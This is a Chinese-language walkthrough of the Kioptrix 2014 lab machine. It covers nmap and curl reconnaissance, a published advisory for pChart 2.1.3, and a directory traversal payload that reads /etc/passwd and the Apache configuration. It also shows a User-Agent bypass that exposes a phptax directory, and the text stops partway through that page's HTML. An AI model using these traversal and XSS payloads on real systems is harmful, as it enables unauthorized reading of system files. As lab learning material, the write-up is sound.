
# 0. 准备
<details><summary>做这个靶机的收获、感想</summary>
<pre><code>
[官方渗透测试的执行标准的描述](http://www.pentest-standard.org/index.php/Main_Page)
> http://www.pentest-standard.org/index.php/Main_Page
1. Pre-engagement Interactions  前期交互
2. Intelligence Gathering   情报收集
3. Threat Modeling  威胁建模
4. Vulnerability Analysis   漏洞分析
5. Exploitation     漏洞利用
6. Post Exploitation    后渗透阶段
7. Reporting    报告阶段
最近在做一些靶机的时候有些迷茫，感觉很多时候是拍脑袋做事，想到哪一块就去做哪一块，在碰到困难、困境的时候，甚至感觉到思路很混乱，没有渗透测试的大局观，也缺少俯视整个过程的意识；以前只是想着能够挖掘出漏洞就是一个有效的渗透测试过程，挖不出漏洞怎么样都是空谈，可以说完全只关注到了结果，完全忽视了其他环节的重要性，尤其在做这个靶机的时候，体会尤其深刻；同时，在思想上就想一上手就去发现一些严重的RCE漏洞拿到进入系统的权限的想法在很大程度上影响了自己的做事方式：急功近利；综上因素，因此，又重新回顾一下渗透测试的七个流程，对比自己的渗透测试思绪，发现还是存在一些问题的，比如：
+ 信息收集阶段：存在很多忽略的信息，系统版本、系统架构、软件版本；
+ 威胁建模阶段：存在很多知识盲点，导致没有思路，比如常见的配置文件路径、比如应用反馈出来的现象如何对应到对应的配置文件中；
+ 漏洞分析阶段+漏洞利用：读代码的能力还是不足，也许是接触的代码类型较多(虽然大多是都是懂点皮毛)HTML、CSS、JS、PHP、JSP、PYTHON、GO、C、C++、JAVA，很多时候浮躁到不去分析exp代码，只是一味的拿来主义，一上来就去用，利用不成功也不知道如何去调试、修改EXP，但是别人就能利用成功，这就是差距；可能这两个阶段中用一句话总结比较合适：要着重培养自己的漏洞分析和利用能力，而不是工具的熟练程度。
+ 后渗透阶段：大多数时候，拿到系统的最高权限基本上就已经宣告工作的结束了，这也就造成拿到系统权限就是万事大吉了，对于后续的有价值信息的收集、权限的维持、多个后门等还是比较薄弱的，甚至于与蓝队的拉锯能力还是比较匮乏的。
+ 这七个阶段不是线性(顺序性)的关系，而是不断反复的过程。
</code></pre>
</details>


# 1. 过程

## 1.1. 信息收集

<details><summary>1. 主机探测</summary>

```shell
┌──(root㉿kali)-[~]
└─# nmap -sn 192.168.0.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-11 04:32 EDT
Nmap scan report for 192.168.0.1
Host is up (0.00065s latency).
MAC Address: 60:3A:7C:31:E8:66 (Tp-link Technologies)
Nmap scan report for 192.168.0.3
Host is up (0.027s latency).
MAC Address: A4:5E:60:C2:D9:0B (Apple)
Nmap scan report for 192.168.0.103
Host is up (0.000053s latency).
MAC Address: 00:0C:29:D9:5C:2C (VMware)
Nmap scan report for 192.168.0.106
Host is up (0.000073s latency).
MAC Address: B4:2E:99:86:D5:F2 (Giga-byte Technology)
Nmap scan report for 192.168.0.100
Host is up.
Nmap done: 256 IP addresses (5 hosts up) scanned in 1.96 seconds
```
</details>

<details><summary>2. 端口和服务探测</summary>

```shell
┌──(root㉿kali)-[/kioptrix4]
└─# cat nmap.text
# Nmap 7.92 scan initiated Fri Jun  3 22:14:29 2022 as: nmap -sT -p- -v -T 5 -sC -A -Pn -oN nmap.text 192.168.0.102
Nmap scan report for 192.168.0.102
Host is up (0.00042s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
MAC Address: 00:0C:29:D9:5C:2C (VMware)
Device type: general purpose|specialized|storage-misc
Running (JUST GUESSING): FreeBSD 9.X|10.X|7.X|8.X|6.X (93%), AVtech embedded (91%)
OS CPE: cpe:/o:freebsd:freebsd:9 cpe:/o:freebsd:freebsd:10 cpe:/o:freebsd:freebsd:7 cpe:/o:freebsd:freebsd:8 cpe:/o:freebsd:freebsd:6.2 cpe:/a:nas4free:nas4free cpe:/o:freebsd:freebsd:10.2
Aggressive OS guesses: FreeBSD 9.0-RELEASE - 10.3-RELEASE (93%), FreeBSD 9.3-RELEASE (91%), AVtech Room Alert 26W environmental monitor (91%), FreeBSD 9.0-RELEASE (90%), FreeBSD 7.0-RELEASE - 9.0-RELEASE (88%), FreeBSD 7.0-RELEASE (87%), FreeBSD 7.1-PRERELEASE 7.2-STABLE (87%), FreeBSD 7.2-RELEASE - 8.0-RELEASE (87%), FreeBSD 9.1-RELEASE or 10.1-RELEASE (87%), FreeBSD 8.1-RELEASE (86%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.000 days (since Fri Jun  3 22:15:32 2022)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental

TRACEROUTE
HOP RTT     ADDRESS
1   0.42 ms 192.168.0.102

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun  3 22:15:54 2022 -- 1 IP address (1 host up) scanned in 85.56 seconds
```
</details>

<details><summary>3. 测试一下服务</summary>

```shell
# 80端口
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v http://192.168.0.103
*   Trying 192.168.0.103:80...
* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET / HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 11 Jun 2022 08:55:11 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< Last-Modified: Sat, 29 Mar 2014 17:22:52 GMT
< ETag: "105c6-98-4f5c211723300"
< Accept-Ranges: bytes
< Content-Length: 152
< Content-Type: text/html
<
<html>
 <head>
  <!--
  <META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
  -->
 </head>
 <body>
  <h1>It works!</h1>
 </body>
</html>
* Connection #0 to host 192.168.0.103 left intact
# 发现pChart2.1.3，并且重定向到了examples/index.php页面
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v http://192.168.0.103/pChart2.1.3/index.php
*   Trying 192.168.0.103:80...
* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET /pChart2.1.3/index.php HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 Found
< Date: Sat, 11 Jun 2022 08:59:06 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< X-Powered-By: PHP/5.3.8
< Location: examples/index.php
< Content-Length: 0
< Content-Type: text/html
<
* Connection #0 to host 192.168.0.103 left intact
# 8080端口
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v http://192.168.0.103:8080/
*   Trying 192.168.0.103:8080...
* Connected to 192.168.0.103 (192.168.0.103) port 8080 (#0)
> GET / HTTP/1.1
> Host: 192.168.0.103:8080
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 403 Forbidden
< Date: Sat, 11 Jun 2022 08:56:55 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< Content-Length: 202
< Content-Type: text/html; charset=iso-8859-1
<
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>403 Forbidden</title>
</head><body>
<h1>Forbidden</h1>
<p>You don't have permission to access /
on this server.</p>
</body></html>
* Connection #0 to host 192.168.0.103 left intact 
# 而且我发现该主机是不能ping的
┌──(root㉿kali)-[/kioptrix4]
└─# ping -v 192.168.0.103 -c 1
PING 192.168.0.103 (192.168.0.103) 56(84) bytes of data.

--- 192.168.0.103 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```
</details>


## 1.2. 威胁建模
## 1.3. 漏洞分析

<details><summary>1. pChart2.1.3</summary>

```shell
┌──(root㉿kali)-[/kioptrix4]
└─# searchsploit pChart
------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                       |  Path
------------------------------------------------------------------------------------- ---------------------------------
pChart 2.1.3 - Multiple Vulnerabilities                                              | php/webapps/31173.txt
------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
# 提到了2个漏洞目录穿越、XSS
┌──(root㉿kali)-[/kioptrix4]
└─# cat 31173.txt
# Exploit Title: pChart 2.1.3 Directory Traversal and Reflected XSS
# Date: 2014-01-24
# Exploit Author: Balazs Makany
# Vendor Homepage: www.pchart.net
# Software Link: www.pchart.net/download
# Google Dork: intitle:"pChart 2.x - examples" intext:"2.1.3"
# Version: 2.1.3
# Tested on: N/A (Web Application. Tested on FreeBSD and Apache)
# CVE : N/A

[0] Summary:
PHP library pChart 2.1.3 (and possibly previous versions) by default
contains an examples folder, where the application is vulnerable to
Directory Traversal and Cross-Site Scripting (XSS).
It is plausible that custom built production code contains similar
problems if the usage of the library was copied from the examples.
The exploit author engaged the vendor before publicly disclosing the
vulnerability and consequently the vendor released an official fix
before the vulnerability was published.
#
#
[1] Directory Traversal:
"hxxp://localhost/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd"
The traversal is executed with the web server's privilege and leads to
sensitive file disclosure (passwd, siteconf.inc.php or similar),
access to source codes, hardcoded passwords or other high impact
consequences, depending on the web server's configuration.
This problem may exists in the production code if the example code was
copied into the production environment.
#
Directory Traversal remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.
#
#
[2] Cross-Site Scripting (XSS):
"hxxp://localhost/examples/sandbox/script/session.php?<script>alert('XSS')</script>
This file uses multiple variables throughout the session, and most of
them are vulnerable to XSS attacks. Certain parameters are persistent
throughout the session and therefore persists until the user session
is active. The parameters are unfiltered.
#
Cross-Site Scripting remediation:
1) Update to the latest version of the software.
2) Remove public access to the examples folder where applicable.
3) Use a Web Application Firewall or similar technology to filter
malicious input attempts.
#

[3] Disclosure timeline:
2014 January 16 - Vulnerability confirmed, vendor contacted
2014 January 17 - Vendor replied, responsible disclosure was orchestrated
2014 January 24 - Vendor was inquired about progress, vendor replied
and noted that the official patch is released.
```
</details>

<details><summary>2. 关于8080不能访问</summary>

<pre>这里就体现出信息收集的重要性了，在目录穿越漏洞中读取`/etc/passwd`这个文件中提示系统版本是freebsd 9.0，同时根据访问的现象可以有可能是httpd.conf配置文件做了限制，现在只要能确认文件路径，再结合LFI也许能够找到原因：</pre>
<pre><img src="https://github.com/eagleatman/mywriteup/blob/main/kioptrix-2014/images/2.png" width="56%" /></pre>
```shell
┌──(root㉿kali)-[/kioptrix4]
└─# curl -v "http://192.168.0.103/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf" | html2text
*   Trying 192.168.0.103:80...
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 192.168.0.103 (192.168.0.103) port 80 (#0)
> GET /pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf HTTP/1.1
> Host: 192.168.0.103
> User-Agent: curl/7.82.0
> Accept: */*
>
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Sat, 11 Jun 2022 10:02:12 GMT
< Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
< X-Powered-By: PHP/5.3.8
< Transfer-Encoding: chunked
< Content-Type: text/html
<
{ [4131 bytes data]
100 31906    0 31906    0     0  5767k      0 --:--:-- --:--:-- --:--:-- 6231k
* Connection #0 to host 192.168.0.103 left intact
#
# This is the main Apache HTTP server configuration file.  It contains the
# configuration directives that give the server its instructions.
# See <URL:http://httpd.apache.org/docs/2.2> for detailed information.
# In particular, see
# <URL:http://httpd.apache.org/docs/2.2/mod/directives.html>
# for a discussion of each configuration directive.
#
# Do NOT simply read the instructions in here without understanding
# what they do.  They're here only as hints or reminders.  If you are unsure
# consult the online docs. You have been warned.
#
# Configuration and logfile names: If the filenames you specify for many
# of the server's control files begin with "/" (or "drive:/" for Win32), the
# server will use that explicit path.  If the filenames do *not* begin
# with "/", the value of ServerRoot is prepended -- so "/var/log/foo_log"
# with ServerRoot set to "/usr/local" will be interpreted by the
# server as "/usr/local//var/log/foo_log".
#
# ServerRoot: The top of the directory tree under which the server's
# configuration, error, and log files are kept.
#
# Do not add a slash at the end of the directory path.  If you point
# ServerRoot at a non-local disk, be sure to point the LockFile directive
# at a local disk.  If you wish to share the same ServerRoot for multiple
# httpd daemons, you will need to change at least LockFile and PidFile.
#
ServerRoot "/usr/local"
#
# Listen: Allows you to bind Apache to specific IP addresses and/or
# ports, instead of the default. See also the <VirtualHost>
# directive.
#
# Change this to Listen on specific IP addresses as shown below to
# prevent Apache from glomming onto all bound IP addresses.
#
#Listen 12.34.56.78:80
Listen 80
Listen 8080
#
# Dynamic Shared Object (DSO) Support
#
# To be able to use the functionality of a module which was built as a DSO you
# have to place corresponding `LoadModule' lines at this location so the
# directives contained in it are actually available _before_ they are used.
# Statically compiled modules (those listed by `httpd -l') do not need
# to be loaded here.
#
# Example:
# LoadModule foo_module modules/mod_foo.so
#
LoadModule authn_file_module libexec/apache22/mod_authn_file.so
LoadModule authn_dbm_module libexec/apache22/mod_authn_dbm.so
LoadModule authn_anon_module libexec/apache22/mod_authn_anon.so
LoadModule authn_default_module libexec/apache22/mod_authn_default.so
LoadModule authn_alias_module libexec/apache22/mod_authn_alias.so
LoadModule authz_host_module libexec/apache22/mod_authz_host.so
LoadModule authz_groupfile_module libexec/apache22/mod_authz_groupfile.so
LoadModule authz_user_module libexec/apache22/mod_authz_user.so
LoadModule authz_dbm_module libexec/apache22/mod_authz_dbm.so
LoadModule authz_owner_module libexec/apache22/mod_authz_owner.so
LoadModule authz_default_module libexec/apache22/mod_authz_default.so
LoadModule auth_basic_module libexec/apache22/mod_auth_basic.so
LoadModule auth_digest_module libexec/apache22/mod_auth_digest.so
LoadModule file_cache_module libexec/apache22/mod_file_cache.so
LoadModule cache_module libexec/apache22/mod_cache.so
LoadModule disk_cache_module libexec/apache22/mod_disk_cache.so
LoadModule dumpio_module libexec/apache22/mod_dumpio.so
LoadModule reqtimeout_module libexec/apache22/mod_reqtimeout.so
LoadModule include_module libexec/apache22/mod_include.so
LoadModule filter_module libexec/apache22/mod_filter.so
LoadModule charset_lite_module libexec/apache22/mod_charset_lite.so
LoadModule deflate_module libexec/apache22/mod_deflate.so
LoadModule log_config_module libexec/apache22/mod_log_config.so
LoadModule logio_module libexec/apache22/mod_logio.so
LoadModule env_module libexec/apache22/mod_env.so
LoadModule mime_magic_module libexec/apache22/mod_mime_magic.so
LoadModule cern_meta_module libexec/apache22/mod_cern_meta.so
LoadModule expires_module libexec/apache22/mod_expires.so
LoadModule headers_module libexec/apache22/mod_headers.so
LoadModule usertrack_module libexec/apache22/mod_usertrack.so
LoadModule unique_id_module libexec/apache22/mod_unique_id.so
LoadModule setenvif_module libexec/apache22/mod_setenvif.so
LoadModule version_module libexec/apache22/mod_version.so
LoadModule ssl_module libexec/apache22/mod_ssl.so
LoadModule mime_module libexec/apache22/mod_mime.so
LoadModule dav_module libexec/apache22/mod_dav.so
LoadModule status_module libexec/apache22/mod_status.so
LoadModule autoindex_module libexec/apache22/mod_autoindex.so
LoadModule asis_module libexec/apache22/mod_asis.so
LoadModule info_module libexec/apache22/mod_info.so
LoadModule cgi_module libexec/apache22/mod_cgi.so
LoadModule dav_fs_module libexec/apache22/mod_dav_fs.so
LoadModule vhost_alias_module libexec/apache22/mod_vhost_alias.so
LoadModule negotiation_module libexec/apache22/mod_negotiation.so
LoadModule dir_module libexec/apache22/mod_dir.so
LoadModule imagemap_module libexec/apache22/mod_imagemap.so
LoadModule actions_module libexec/apache22/mod_actions.so
LoadModule speling_module libexec/apache22/mod_speling.so
LoadModule userdir_module libexec/apache22/mod_userdir.so
LoadModule alias_module libexec/apache22/mod_alias.so
LoadModule rewrite_module libexec/apache22/mod_rewrite.so
LoadModule php5_module        libexec/apache22/libphp5.so
<IfModule !mpm_netware_module>
<IfModule !mpm_winnt_module>
#
# If you wish httpd to run as a different user or group, you must run
# httpd as root initially and it will switch.
#
# User/Group: The name (or #number) of the user/group to run httpd as.
# It is usually good practice to create a dedicated user and group for
# running httpd, as with most system services.
#
User www
Group www
</IfModule>
</IfModule>
# 'Main' server configuration
#
# The directives in this section set up the values used by the 'main'
# server, which responds to any requests that aren't handled by a
# <VirtualHost> definition.  These values also provide defaults for
# any <VirtualHost> containers you may define later in the file.
#
# All of these directives may appear inside <VirtualHost> containers,
# in which case these default settings will be overridden for the
# virtual host being defined.
#
#
# ServerAdmin: Your address, where problems with the server should be
# e-mailed.  This address appears on some server-generated pages, such
# as error documents.  e.g. admin@your-domain.com
#
ServerAdmin you@example.com
#
# ServerName gives the name and port that the server uses to identify itself.
# This can often be determined automatically, but we recommend you specify
# it explicitly to prevent problems during startup.
#
# If your host doesn't have a registered DNS name, enter its IP address here.
#
#ServerName www.example.com:80
#
# DocumentRoot: The directory out of which you will serve your
# documents. By default, all requests are taken from this directory, but
# symbolic links and aliases may be used to point to other locations.
#
DocumentRoot "/usr/local/www/apache22/data"
#
# Each directory to which Apache has access can be configured with respect
# to which services and features are allowed and/or disabled in that
# directory (and its subdirectories).
#
# First, we configure the "default" to be a very restrictive set of
# features.
#
<Directory />
    AllowOverride None
    Order deny,allow
    Deny from all
</Directory>
#
# Note that from this point forward you must specifically allow
# particular features to be enabled - so if something's not working as
# you might expect, make sure that you have specifically enabled it
# below.
#
#
# This should be changed to whatever you set DocumentRoot to.
#
<Directory "/usr/local/www/apache22/data">
    #
    # Possible values for the Options directive are "None", "All",
    # or any combination of:
    #   Indexes Includes FollowSymLinks SymLinksifOwnerMatch ExecCGI MultiViews
    #
    # Note that "MultiViews" must be named *explicitly* --- "Options All"
    # doesn't give it to you.
    #
    # The Options directive is both complicated and important.  Please see
    # http://httpd.apache.org/docs/2.2/mod/core.html#options
    # for more information.
    #
    Options Indexes FollowSymLinks
    #
    # AllowOverride controls what directives may be placed in .htaccess files.
    # It can be "All", "None", or any combination of the keywords:
    #   Options FileInfo AuthConfig Limit
    #
    AllowOverride None
    #
    # Controls who can get stuff from this server.
    #
    Order allow,deny
    Allow from all
</Directory>
#
# DirectoryIndex: sets the file that Apache will serve if a directory
# is requested.
#
<IfModule dir_module>
    DirectoryIndex index.php index.html
</IfModule>
#
# The following lines prevent .htaccess and .htpasswd files from being
# viewed by Web clients.
#
<FilesMatch "^\.ht">
    Order allow,deny
    Deny from all
    Satisfy All
</FilesMatch>
#
# ErrorLog: The location of the error log file.
# If you do not specify an ErrorLog directive within a <VirtualHost>
# container, error messages relating to that virtual host will be
# logged here.  If you *do* define an error logfile for a <VirtualHost>
# container, that host's errors will be logged there and not here.
#
ErrorLog "/var/log/httpd-error.log"
#
# LogLevel: Control the number of messages logged to the error_log.
# Possible values include: debug, info, notice, warn, error, crit,
# alert, emerg.
#
LogLevel warn
<IfModule log_config_module>
    #
    # The following directives define some format nicknames for use with
    # a CustomLog directive (see below).
    #
    LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-
Agent}i\"" combined
    LogFormat "%h %l %u %t \"%r\" %>s %b" common
    <IfModule logio_module>
      # You need to enable mod_logio.c to use %I and %O
      LogFormat "%h %l %u %t \"%r\" %>s %b \"%{Referer}i\" \"%{User-
Agent}i\" %I %O" combinedio
    </IfModule>
    #
    # The location and format of the access logfile (Common Logfile Format).
    # If you do not define any access logfiles within a <VirtualHost>
    # container, they will be logged here.  Contrariwise, if you *do*
    # define per-<VirtualHost> access logfiles, transactions will be
    # logged therein and *not* in this file.
    #
    #CustomLog "/var/log/httpd-access.log" common
    #
    # If you prefer a logfile with access, agent, and referer information
    # (Combined Logfile Format) you can use the following directive.
    #
    CustomLog "/var/log/httpd-access.log" combined
</IfModule>
<IfModule alias_module>
    #
    # Redirect: Allows you to tell clients about documents that used to
    # exist in your server's namespace, but do not anymore. The client
    # will make a new request for the document at its new location.
    # Example:
    # Redirect permanent /foo http://www.example.com/bar
    #
    # Alias: Maps web paths into filesystem paths and is used to
    # access content that does not live under the DocumentRoot.
    # Example:
    # Alias /webpath /full/filesystem/path
    #
    # If you include a trailing / on /webpath then the server will
    # require it to be present in the URL.  You will also likely
    # need to provide a <Directory> section to allow access to
    # the filesystem path.
    #
    # ScriptAlias: This controls which directories contain server scripts.
    # ScriptAliases are essentially the same as Aliases, except that
    # documents in the target directory are treated as applications and
    # run by the server when requested rather than as documents sent to the
    # client.  The same rules about trailing "/" apply to ScriptAlias
    # directives as to Alias.
    #
    ScriptAlias /cgi-bin/ "/usr/local/www/apache22/cgi-bin/"
</IfModule>
<IfModule cgid_module>
    #
    # ScriptSock: On threaded servers, designate the path to the UNIX
    # socket used to communicate with the CGI daemon of mod_cgid.
    #
    #Scriptsock /var/run/cgisock
</IfModule>
#
# "/usr/local/www/apache22/cgi-
bin" should be changed to whatever your ScriptAliased
# CGI directory exists, if you have that configured.
#
<Directory "/usr/local/www/apache22/cgi-bin">
    AllowOverride None
    Options None
    Order allow,deny
    Allow from all
</Directory>
#
# DefaultType: the default MIME type the server will use for a document
# if it cannot otherwise determine one, such as from filename extensions.
# If your server contains mostly text or HTML documents, "text/plain" is
# a good value.  If most of your content is binary, such as applications
# or images, you may want to use "application/octet-stream" instead to
# keep browsers from trying to display binary files as though they are
# text.
#
DefaultType text/plain
<IfModule mime_module>
    #
    # TypesConfig points to the file containing the list of mappings from
    # filename extension to MIME-type.
    #
    TypesConfig etc/apache22/mime.types
    #
    # AddType allows you to add to or override the MIME configuration
    # file specified in TypesConfig for specific file types.
    #
    #AddType application/x-gzip .tgz
    #
    # AddEncoding allows you to have certain browsers uncompress
    # information on the fly. Note: Not all browsers support this.
    #
    #AddEncoding x-compress .Z
    #AddEncoding x-gzip .gz .tgz
    #
    # If the AddEncoding directives above are commented-out, then you
    # probably should define those extensions to indicate media types:
    #
    AddType application/x-compress .Z
    AddType application/x-gzip .gz .tgz
    #
    # AddHandler allows you to map certain file extensions to "handlers":
    # actions unrelated to filetype. These can be either built into the server
    # or added with the Action directive (see below)
    #
    # To use CGI scripts outside of ScriptAliased directories:
    # (You will also need to add "ExecCGI" to the "Options" directive.)
    #
    #AddHandler cgi-script .cgi
    # For type maps (negotiated resources):
    #AddHandler type-map var
    #
    # Filters allow you to process content before it is sent to the client.
    #
    # To parse .shtml files for server-side includes (SSI):
    # (You will also need to add "Includes" to the "Options" directive.)
    #
    #AddType text/html .shtml
    #AddOutputFilter INCLUDES .shtml
    AddType application/x-httpd-php .php
    AddType application/x-httpd-php-source .phps
</IfModule>
#
# The mod_mime_magic module allows the server to use various hints from the
# contents of the file itself to determine its type.  The MIMEMagicFile
# directive tells the module where the hint definitions are located.
#
#MIMEMagicFile etc/apache22/magic
#
# Customizable error responses come in three flavors:
# 1) plain text 2) local redirects 3) external redirects
#
# Some examples:
#ErrorDocument 500 "The server made a boo boo."
#ErrorDocument 404 /missing.html
#ErrorDocument 404 "/cgi-bin/missing_handler.pl"
#ErrorDocument 402 http://www.example.com/subscription_info.html
#
#
# MaxRanges: Maximum number of Ranges in a request before
# returning the entire resource, or 0 for unlimited
# Default setting is to accept 200 Ranges
#MaxRanges 0
#
# EnableMMAP and EnableSendfile: On systems that support it,
# memory-mapping or the sendfile syscall is used to deliver
# files.  This usually improves server performance, but must
# be turned off when serving from networked-mounted
# filesystems or if support for these functions is otherwise
# broken on your system.
#
#EnableMMAP off
#EnableSendfile off
# Supplemental configuration
#
# The configuration files in the etc/apache22/extra/ directory can be
# included to add extra features or to modify the default configuration of
# the server, or you may simply copy their contents here and change as
# necessary.
# Server-pool management (MPM specific)
#Include etc/apache22/extra/httpd-mpm.conf
# Multi-language error messages
#Include etc/apache22/extra/httpd-multilang-errordoc.conf
# Fancy directory listings
#Include etc/apache22/extra/httpd-autoindex.conf
# Language settings
#Include etc/apache22/extra/httpd-languages.conf
# User home directories
#Include etc/apache22/extra/httpd-userdir.conf
# Real-time info on requests and configuration
#Include etc/apache22/extra/httpd-info.conf
# Virtual hosts
#Include etc/apache22/extra/httpd-vhosts.conf
# Local access to the Apache HTTP Server Manual
#Include etc/apache22/extra/httpd-manual.conf
# Distributed authoring and versioning (WebDAV)
#Include etc/apache22/extra/httpd-dav.conf
# Various default settings
#Include etc/apache22/extra/httpd-default.conf
# Secure (SSL/TLS) connections
#Include etc/apache22/extra/httpd-ssl.conf
#
# Note: The following must must be present to support
#       starting without SSL on platforms with no /dev/random equivalent
#       but a statically compiled-in mod_ssl.
#
<IfModule ssl_module>
SSLRandomSeed startup builtin
SSLRandomSeed connect builtin
</IfModule>
SetEnvIf User-Agent ^Mozilla/4.0 Mozilla4_browser
<VirtualHost *:8080>
    DocumentRoot /usr/local/www/apache22/data2
<Directory "/usr/local/www/apache22/data2">
    Options Indexes FollowSymLinks
    AllowOverride All
    Order allow,deny
    Allow from env=Mozilla4_browser
</Directory>
</VirtualHost>
Include etc/apache22/Includes/*.conf
```
<pre>通过配置文件可以看出应该只能通过`User-Agent: Mozilla/4.0`才能访问</pre>
```shell
┌──(root㉿kali)-[/kioptrix4]
└─# curl -A "Mozilla/4.0" http://192.168.0.103:8080/
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /</title>
 </head>
 <body>
<h1>Index of /</h1>
<ul><li><a href="phptax/"> phptax/</a></li>
</ul>
</body></html>
```
<pre>有一个phptax的目录</pre>
```shell
┌──(root㉿kali)-[/kioptrix4]
└─# curl -A "Mozilla/4.0" http://192.168.0.103:8080/phptax/
<html><title>PHPTAX by William L. Berggren 2003(c)</title>
<body bgcolor='777777' link='000000' vlink='000000' alink='000000'>
<table cellpadding='2' cellspacing='0' border='1' width='780' bgcolor='#999900'>
<tbody><tr height='660'><td valign='top' width='280' bgcolor='#ffcc00'><img border=0 src='./pictures/phptax.png' alt='phptax'><a href='index.php?pfilez=1040pg1.tob'><img border=0 src='./pictures/1040ico1.png'alt='tiny1040'></a><a href='index.php?pfilez=1040pg1.tob&pdf=make'><img border=0 src='./pictures/makepdf2.png'alt='Make PDF'></a><a href='./data/pdf/1040pg1.pdf'><img border=0 src='./pictures/viewpdf2.png'alt='Make PDF'></a><a href='index.php?pfilez=1040pg2.tob'><img border=0 src='./pictures/1040ico2.png'alt='tiny1040'></a><a href='index.php?pfilez=1040pg2.tob&pdf=make'><img border=0 src='./pictures/makepdf2.png'alt='Make PDF'></a><a href='./data/pdf/1040pg2.pdf'><img border=0 src='./pictures/viewpdf2.png'alt='Make PDF'></a><BR><a href='index.php?pfilez=1040ab-pg1.tob'><img border=0 src='./pictures/1040icoab1.png'alt='tiny1040'></a><a href='index.php?pfilez=1040ab-pg1.tob&pdf=make'><img border=0 src='./pictures/makepdf2.png'alt='Make PDF'></a><a href='./data/pdf/1040ab-pg1.pdf'><img border=0 src='./pictures/viewpdf2.png'alt='Make PDF'></a><a href='index.php?pfilez=1040ab-pg2.tob'><img border=0 src='./pictures/1040icoab2.png'alt='tiny1040'></a><a href='index.php?pfilez=1040ab-pg2.tob&pdf=make'><img border=0 src='./pictures/makepdf2.png'alt='Make PDF'></a><a href='./data/pdf/1040ab-pg2.pdf'><img border=0 src='./pictures/viewpdf2.png'alt='Make PDF'></a><BR><a href='index.php?pfilez=1040d-pg1.tob'><img border=0 src='./pictures/1040icod1.png'alt='tiny1040'></a><a href='index.php?pfilez=1040d-pg1.tob&pdf=make'><img border=0 src='./pictures/makepdf2.png'alt='Make PDF'></a><a href='./data/pdf/1040d-pg1.pdf'><img border=0 src='./pictures/viewpdf2.png'alt='Make PDF'></a><a href='index.php?pfilez=1040d-pg2.tob'><img border=0 src='./pictures/1040icod2.png'alt='tiny1040'></a><a href='index.php?pfilez=1040d-pg2.tob&pdf=make'><img border=0 src='./pictures/makepdf2.png'alt='Make PDF'></a><a href='./data/pdf/1040d-pg2.pdf'><img border=0 src='./pictures/viewpdf2.png'alt='Make PDF'></a><BR><a href='index.php?pfilez=1040d1-pg1.tob'><img border=0 src='./pictures/1040ico1d1.png'alt='tiny1040'></a><a href='index.php?pfilez=1040d1-pg1.tob&pdf=make'><img border=0 src='./pictures/makepdf2.png'alt='Make PDF'></a><a href='./data/pdf/1040d1-pg1.pdf'><img border=0 src='./pictures/viewpdf2.png'alt='Make PDF'></a><a href='index.php?pfilez=1040d1-pg2.tob'><img border=0 src='./pictures/1040ico1d2.png'alt='tiny1040'></a><a href='index.php?pfilez=1040d1-pg2.tob&pdf=make'><img border=0 src='./pictures/makepdf2.png'alt='Make PDF'></a><a href='./data/pdf/1040d1-pg2.pdf'><img border=0 src='./pictures/viewpdf2.png'alt='Make PDF'></a><br><a href='./pictures/i1040abcde.pdf'><img border=0 src='./pictures/1040abcde.png'alt='instructions'></a><a href='index.php?pfilez=1040w2.tob'><img border=0 src='./pictures/w2worksheet.png'alt='1040w2'></a></td><td 